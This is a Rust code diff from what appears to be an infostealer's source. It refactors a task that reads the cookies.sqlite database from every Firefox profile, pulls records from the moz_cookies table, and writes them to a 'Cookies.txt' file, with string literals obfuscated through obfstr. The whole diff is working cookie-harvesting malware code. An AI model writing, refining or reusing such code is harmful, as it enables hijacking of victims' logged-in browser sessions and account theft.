@@ -3,7 +3,7 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::Path;
-use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
 use crate::gecko::GeckoBrowserData;
 use obfstr::obfstr as s;
 use database::TableRecord;
@@ -28,20 +28,17 @@ impl Task for CookiesTask<'_> {
     parent_name!("Cookies.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let Some(cookies) = collect_from_all_profiles(
+        let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
-            read_cookies
+            |profile| profile / s!("cookies.sqlite"),
+            s!("moz_cookies"),
+            extract_cookies_from_record
         ) else {
             return
         };
 
         let _ = to_string_and_write_all(&cookies, "\n", parent);
     }
-}
-
-fn read_cookies(profile: &Path) -> Option<Vec<Cookie>> {
-    let cookies_path = profile / s!("cookies.sqlite");
-    read_sqlite3_and_map_records(&cookies_path, s!("moz_cookies"), extract_cookies_from_record)
 }
 
 fn extract_cookies_from_record(record: &dyn TableRecord) -> Option<Cookie> {
